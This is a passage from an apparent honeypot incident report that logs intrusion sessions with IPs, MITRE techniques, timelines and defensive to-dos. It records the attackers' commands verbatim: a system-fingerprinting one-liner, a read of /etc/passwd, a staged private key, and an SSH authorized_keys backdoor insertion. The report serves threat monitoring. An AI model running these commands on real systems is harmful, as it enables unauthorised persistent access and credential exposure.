| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.success` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.command.input` |
| `2026-09-25 18:41:06` | `cowrie.log.closed` |
| `2026-09-25 18:41:07` | `cowrie.session.params` |
| `2026-09-25 18:41:07` | `cowrie.command.input` |
| `2026-09-25 18:41:08` | `cowrie.log.closed` |
| `2026-09-25 18:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d117cca29b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:42 |
| **Last Seen** | 2026-09-25 18:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:42:59` | `cowrie.session.connect` |
| `2026-09-25 18:42:59` | `cowrie.client.version` |
| `2026-09-25 18:42:59` | `cowrie.client.kex` |
| `2026-09-25 18:43:01` | `cowrie.login.success` |
| `2026-09-25 18:43:02` | `cowrie.session.params` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.success` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:02` | `cowrie.command.input` |
| `2026-09-25 18:43:03` | `cowrie.log.closed` |
| `2026-09-25 18:43:04` | `cowrie.session.params` |
| `2026-09-25 18:43:04` | `cowrie.command.input` |
| `2026-09-25 18:43:05` | `cowrie.log.closed` |
| `2026-09-25 18:43:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f63bff65ad

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:44 |
| **Last Seen** | 2026-09-25 18:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:44:52` | `cowrie.session.connect` |
| `2026-09-25 18:44:52` | `cowrie.client.version` |
| `2026-09-25 18:44:52` | `cowrie.client.kex` |
| `2026-09-25 18:44:54` | `cowrie.login.success` |
| `2026-09-25 18:44:55` | `cowrie.session.params` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.success` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:55` | `cowrie.command.input` |
| `2026-09-25 18:44:56` | `cowrie.log.closed` |
| `2026-09-25 18:44:57` | `cowrie.session.params` |
| `2026-09-25 18:44:57` | `cowrie.command.input` |
| `2026-09-25 18:44:58` | `cowrie.log.closed` |
| `2026-09-25 18:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d67d766bf9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:46 |
| **Last Seen** | 2026-09-25 18:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:46:47` | `cowrie.session.connect` |
| `2026-09-25 18:46:47` | `cowrie.client.version` |
| `2026-09-25 18:46:47` | `cowrie.client.kex` |
| `2026-09-25 18:46:49` | `cowrie.login.success` |
| `2026-09-25 18:46:50` | `cowrie.session.params` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.success` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.command.input` |
| `2026-09-25 18:46:50` | `cowrie.log.closed` |
| `2026-09-25 18:46:52` | `cowrie.session.params` |
| `2026-09-25 18:46:52` | `cowrie.command.input` |
| `2026-09-25 18:46:52` | `cowrie.log.closed` |
| `2026-09-25 18:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-408bb428a122

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:48 |
| **Last Seen** | 2026-09-25 18:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:48:43` | `cowrie.session.connect` |
| `2026-09-25 18:48:43` | `cowrie.client.version` |
| `2026-09-25 18:48:43` | `cowrie.client.kex` |
| `2026-09-25 18:48:44` | `cowrie.login.success` |
| `2026-09-25 18:48:46` | `cowrie.session.params` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.success` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.command.input` |
| `2026-09-25 18:48:46` | `cowrie.log.closed` |
| `2026-09-25 18:48:48` | `cowrie.session.params` |
| `2026-09-25 18:48:48` | `cowrie.command.input` |
| `2026-09-25 18:48:48` | `cowrie.log.closed` |
| `2026-09-25 18:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eceab1bb9a6c

| Field | Detail |
|---|---|
| **Source IP** | `157.245.220[.]50` |
| **First Seen** | 2026-09-25 18:49 |
| **Last Seen** | 2026-09-25 18:50 |
| **Session Duration** | 63s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:49:12` | `cowrie.session.connect` |
| `2026-09-25 18:49:13` | `cowrie.telnet.option` |
| `2026-09-25 18:49:13` | `cowrie.telnet.option` |
| `2026-09-25 18:49:13` | `cowrie.login.success` |
| `2026-09-25 18:49:14` | `cowrie.session.params` |
| `2026-09-25 18:49:14` | `cowrie.telnet.option` |
| `2026-09-25 18:49:14` | `cowrie.telnet.option` |
| `2026-09-25 18:49:14` | `cowrie.command.input` |
| `2026-09-25 18:49:14` | `cowrie.command.input` |
| `2026-09-25 18:49:14` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.failed` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:49:15` | `cowrie.command.input` |
| `2026-09-25 18:50:16` | `cowrie.log.closed` |
| `2026-09-25 18:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.220[.]50` to AbuseIPDB if not already reported
- [ ] Block `157.245.220[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a033976c0f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:50 |
| **Last Seen** | 2026-09-25 18:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:50:37` | `cowrie.session.connect` |
| `2026-09-25 18:50:37` | `cowrie.client.version` |
| `2026-09-25 18:50:37` | `cowrie.client.kex` |
| `2026-09-25 18:50:38` | `cowrie.login.success` |
| `2026-09-25 18:50:39` | `cowrie.session.params` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.success` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:39` | `cowrie.command.input` |
| `2026-09-25 18:50:40` | `cowrie.log.closed` |
| `2026-09-25 18:50:41` | `cowrie.session.params` |
| `2026-09-25 18:50:41` | `cowrie.command.input` |
| `2026-09-25 18:50:42` | `cowrie.log.closed` |
| `2026-09-25 18:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cd37c28d5d2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-25 18:51 |
| **Last Seen** | 2026-09-25 18:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:51:30` | `cowrie.session.connect` |
| `2026-09-25 18:51:30` | `cowrie.client.version` |
| `2026-09-25 18:51:30` | `cowrie.client.kex` |
| `2026-09-25 18:51:31` | `cowrie.login.success` |
| `2026-09-25 18:51:31` | `cowrie.direct-tcpip.request` |
| `2026-09-25 18:51:31` | `cowrie.direct-tcpip.data` |
| `2026-09-25 18:51:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fdbbc8d9c11

| Field | Detail |
|---|---|
| **Source IP** | `69.12.166[.]128` |
| **First Seen** | 2026-09-25 18:52 |
| **Last Seen** | 2026-09-25 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:52:23` | `cowrie.session.connect` |
| `2026-09-25 18:52:23` | `cowrie.client.version` |
| `2026-09-25 18:52:23` | `cowrie.client.kex` |
| `2026-09-25 18:52:24` | `cowrie.login.success` |
| `2026-09-25 18:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.12.166[.]128` to AbuseIPDB if not already reported
- [ ] Block `69.12.166[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c22a2efad39

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-25 18:52 |
| **Last Seen** | 2026-09-25 18:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:52:24` | `cowrie.session.connect` |
| `2026-09-25 18:52:24` | `cowrie.client.version` |
| `2026-09-25 18:52:24` | `cowrie.client.kex` |
| `2026-09-25 18:52:25` | `cowrie.login.success` |
| `2026-09-25 18:52:26` | `cowrie.session.params` |
| `2026-09-25 18:52:26` | `cowrie.command.input` |
| `2026-09-25 18:52:26` | `cowrie.session.file_download` |
| `2026-09-25 18:52:26` | `cowrie.session.file_download` |
| `2026-09-25 18:52:26` | `cowrie.log.closed` |
| `2026-09-25 18:52:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa53bb02e1d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:52 |
| **Last Seen** | 2026-09-25 18:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:52:28` | `cowrie.session.connect` |
| `2026-09-25 18:52:28` | `cowrie.client.version` |
| `2026-09-25 18:52:28` | `cowrie.client.kex` |
| `2026-09-25 18:52:30` | `cowrie.login.success` |
| `2026-09-25 18:52:31` | `cowrie.session.params` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.success` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:31` | `cowrie.command.input` |
| `2026-09-25 18:52:32` | `cowrie.log.closed` |
| `2026-09-25 18:52:33` | `cowrie.session.params` |
| `2026-09-25 18:52:33` | `cowrie.command.input` |
| `2026-09-25 18:52:33` | `cowrie.log.closed` |
| `2026-09-25 18:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb41ae20e471

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-25 18:54 |
| **Last Seen** | 2026-09-25 18:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:54:22` | `cowrie.session.connect` |
| `2026-09-25 18:54:22` | `cowrie.client.version` |
| `2026-09-25 18:54:22` | `cowrie.client.kex` |
| `2026-09-25 18:54:23` | `cowrie.login.success` |
| `2026-09-25 18:54:24` | `cowrie.session.params` |
| `2026-09-25 18:54:24` | `cowrie.command.input` |
| `2026-09-25 18:54:24` | `cowrie.command.input` |
| `2026-09-25 18:54:24` | `cowrie.command.input` |
| `2026-09-25 18:54:24` | `cowrie.command.input` |
| `2026-09-25 18:54:24` | `cowrie.command.input` |
| `2026-09-25 18:54:24` | `cowrie.command.success` |
| `2026-09-25 18:54:25` | `cowrie.command.input` |
| `2026-09-25 18:54:25` | `cowrie.command.input` |
| `2026-09-25 18:54:25` | `cowrie.command.input` |
| `2026-09-25 18:54:25` | `cowrie.command.input` |
| `2026-09-25 18:54:25` | `cowrie.log.closed` |
| `2026-09-25 18:54:26` | `cowrie.session.params` |
| `2026-09-25 18:54:26` | `cowrie.command.input` |
| `2026-09-25 18:54:27` | `cowrie.log.closed` |
| `2026-09-25 18:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cccb0172acf9

| Field | Detail |
|---|---|
| **Source IP** | `203.128.6[.]159` |
| **First Seen** | 2026-09-25 18:54 |
| **Last Seen** | 2026-09-25 18:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 18:54:48` | `cowrie.session.connect` |
| `2026-09-25 18:54:48` | `cowrie.client.version` |
| `2026-09-25 18:54:49` | `cowrie.client.kex` |
| `2026-09-25 18:54:50` | `cowrie.login.success` |
| `2026-09-25 18:54:51` | `cowrie.session.params` |
| `2026-09-25 18:54:51` | `cowrie.command.input` |
| `2026-09-25 18:54:51` | `cowrie.command.failed` |
| `2026-09-25 18:54:51` | `cowrie.log.closed` |
| `2026-09-25 18:54:52` | `cowrie.session.params` |
| `2026-09-25 18:54:52` | `cowrie.command.input` |
| `2026-09-25 18:54:52` | `cowrie.session.file_download` |
| `2026-09-25 18:54:52` | `cowrie.log.closed` |
| `2026-09-25 18:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.128.6[.]159` to AbuseIPDB if not already reported
- [ ] Block `203.128.6[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2fa26e5e348

| Field | Detail |
|---|---|
| **Source IP** | `203.128.6[.]159` |
| **First Seen** | 2026-09-25 18:54 |
| **Last Seen** | 2026-09-25 18:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
